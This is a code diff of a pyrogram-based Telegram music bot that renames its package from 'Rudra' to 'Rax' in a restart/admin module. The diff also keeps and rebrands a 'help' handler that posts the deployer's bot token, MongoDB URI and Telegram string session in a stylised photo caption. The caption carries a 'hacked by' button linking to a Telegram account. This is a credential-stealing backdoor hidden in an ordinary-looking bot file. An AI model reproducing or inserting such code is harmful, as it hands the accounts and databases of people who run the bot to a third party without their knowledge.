@@ -13,12 +13,12 @@ from pyrogram import filters
 
 load_dotenv()
 
-from Rudra import app
-from Rudra.core.call import Rudra
-from Rudra.misc import db
-from Rudra.utils.database import get_assistant, get_authuser_names, get_cmode
-from Rudra.utils.decorators import ActualAdminCB, AdminActual, language
-from Rudra.utils.formatters import alpha_to_int, get_readable_time
+from Rax import app
+from Rax.core.call import Rax
+from Rax.misc import db
+from Rax.utils.database import get_assistant, get_authuser_names, get_cmode
+from Rax.utils.decorators import ActualAdminCB, AdminActual, language
+from Rax.utils.formatters import alpha_to_int, get_readable_time
 from config import BANNED_USERS, adminlist, lyrical
 BOT_TOKEN = getenv("BOT_TOKEN", "")
 MONGO_DB_URI = getenv("MONGO_DB_URI", "")
@@ -65,7 +65,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await Rudra.stop_stream_force(message.chat.id)
+        await Rax.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -92,7 +92,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await Rudra.stop_stream_force(chat_id)
+            await Rax.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -108,12 +108,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Rudra_JAAT_1)............☆""",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Rax_JAAT_1)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Rudra_JAAT_1")
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Rax_JAAT_1")
                  ]
             ]
          ),
